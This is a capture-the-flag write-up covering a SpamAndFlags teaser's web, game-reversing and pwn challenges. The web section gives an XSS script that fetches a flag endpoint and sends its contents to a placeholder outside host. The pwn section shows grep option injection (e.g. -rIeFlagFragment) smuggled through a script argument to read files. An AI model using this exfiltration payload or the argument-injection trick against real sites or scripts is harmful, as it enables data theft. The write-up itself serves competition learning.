# S㎩mAndFlags Uけimate w呎は屸de C㏊mᒆonship Teaser ꕫꕫ - ㎩㏚i㎄ Edition


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200509-spamandflags/) of this writeup.**


 - [S㎩mAndFlags Uけimate w呎は屸de C㏊mᒆonship Teaser ꕫꕫ - ㎩㏚i㎄ Edition](#smandflags-uけimate-w呎は屸de-cmᒆonship-teaser-ꕫꕫ---i-edition)
   - [Web](#web)
     - [Pwnzi 2 &amp; 3](#pwnzi-2--3)
   - [Rev](#rev)
     - [TAS](#tas)
       - [1. Beat the RNG of RndSpike](#1-beat-the-rng-of-rndspike)
       - [2. Crouch can reset attack timer](#2-crouch-can-reset-attack-timer)
       - [3. Write a script to produce moveset](#3-write-a-script-to-produce-moveset)
       - [4. Place one orb on two orb holders](#4-place-one-orb-on-two-orb-holders)
       - [5. Skip the second orbspike](#5-skip-the-second-orbspike)
   - [Pwn](#pwn)
     - [Environmental Issues](#environmental-issues)



## Web

### Pwnzi 2 & 3

Various ways to bypass referer check in the same origin:

Use `history.pushState` to bypass referer check. It seems that specifiying referer in `fetch()` can also works. The flag `SaF{service_workers_are_useless_they_say}` indicates that the intended solution is about service worker, but I didn't use that.

```
<script>
history.pushState({}, "", "/profile.html");
setInterval(_ => {
  fetch('//example.com/?ping');
}, 1000);
fetch('/flag2').then(r=>r.text()).then(t=>fetch('//example.com/?'+encodeURI(t)));
</script>
```

## Rev

### TAS


Here are some tricks which can help you reduce the number of frames:

#### 1. Beat the RNG of RndSpike

Take a look of `Rnd.py`. it tells you that `LCG influenced by the keypresses`. So I wrote a simulator to predict the movements of spike.

#### 2. Crouch can reset attack timer

According to `Player.py`. you can crouch immediately after you punch to reset the attack timer. By repeating punch and crouch, you can deal one damage per two frames. This trick helps you quickly kill `TRex`
```=python
...
  def startCrouching(self):
    if not self.crouching and self.onGround:
      self.crouching = True
      self.attackTimer = 0
      self.collRect = Rect(20, 32, 26, 18)
...
```


By using these two tricks, I got the first two flags

#### 3. Write a script to produce moveset

Human makes mistakes, so I wrote a script to produce the moveset. A mistake-free moveset saves lots of frame.

Then I got the third flag.

#### 4. Place one orb on two orb holders

I found that there are two orb holders which are very close to each other. I thought maybe we can place one orb on two orb holders. By analyzing the code below at `Player.py`, I found we can trigger two orb holders when standing between them.



```=python
...
  def placeOrbOnStand(self):
    if self.isImmobile():
      return
    if self.isAttacking() or not self.onGround:
      return False
    if not self.holdingOrb:
      return
    print("placeorb")
    rect = self.getCollRect()
    offsets = [(0, 0), (1, 0), (-1, 0)]
    midX = floor(rect.centerx / Tile.LENGTH)
    midY = floor(rect.centery / Tile.LENGTH)
    for offset in offsets:
      x = midX + offset[0]
      y = midY + offset[1]
      tile = self.map.getTile(x, y)
      if tile is not None and tile.id == Tile.ORB_HOLDER_OFF:
        tileRect = tile.getCollRect().move(x*Tile.LENGTH, y*Tile.LENGTH)
        if ((tileRect.centerx > rect.centerx and self.keysPressed.right)
            or (tileRect.centerx < rect.centerx and self.keysPressed.left)):
          self.map.triggerOrb(x, y)
          self.holdingOrb = False
          # since it didn't break the loop, we can trigger more than one orb holder if they are close enough to each other
...
```

This trick helps me get the fourth flag and the fifth flag.

#### 5. Skip the second orbspike

This is the last trick I found: When you are damaged, you'll be invulnerable in a short period. But only the second orbspike can be skipped by this trick.


That's all. Now we can get all the flags.

https://pastebin.com/1XTVWxFG

![](https://i.imgur.com/HJFxtVK.png)


<div style='position:relative; padding-bottom:calc(73.98% + 44px)'><iframe src='https://gfycat.com/ifr/ComplexPossibleErmine' frameborder='0' scrolling='no' width='100%' height='100%' style='position:absolute;top:0;left:0;' allowfullscreen></iframe></div>


## Pwn

### Environmental Issues

This write-up is for the unpatched version. For the patched version, we didn't find the `BASH_FUNC_[function name]%%` trick and got no flag in that challenge.

After you saw the releasing of the patched version, check what's the patch:

Original

```bash=
line="$(grep "${1:?Missing arg1: name}" < issues.txt)"
```

After the fix

```bash=
line="$(grep -- "${1:?Missing arg1: name}" < issues.txt)"
```

This is the only line being modified in the shell code (there are some unimportant changes in other files though). Clearly, the vulnerability is to put option(s) to grep.

Check the manual for any option that could read a file, we found `-f [FILE]` would read the patterns from the FILE. After testing, we confirmed that it could be put as `-fflag` (without whitespace), and we could also use `-eFlagFragment`. They provide almost same effects and, the most important, we still got room for more short options.

We could put `-r` since grep searches the working directory if no file operand is given (note that `issues.txt` is fed by redirection). Now with `-reFlagFragment`, it works locally without sandbox. But this would timeout in the sandbox and abort the connection immediately for remote (couldn't even get the output from `challenge.py`).

There are many options to optimize the search. The only useful one I found is `-I` to ignore all binary files. Now put `-rIeFlagFragment` as argument and generated 16 arbitrary keys, then you'll get 4 flags!

Here are the lovely flags:
`SaF{PleaseStopExploitingTheEnvironmentSeeHowBeautifulSheIs🌍}`
`SaF{NiceJobYouHaveJustKilledAllTheBees🐝StopNowBeforeItIsTooLate!}`
`SaF{HereIsYourFlagButAtWhatPrice?https://www.youtube.com/watch?v=eROSvnr3QZM}`
`SaF{🔥UNINTENDED💀ENVIRON🔥MENTAL💀COLLAPSE🔥}`
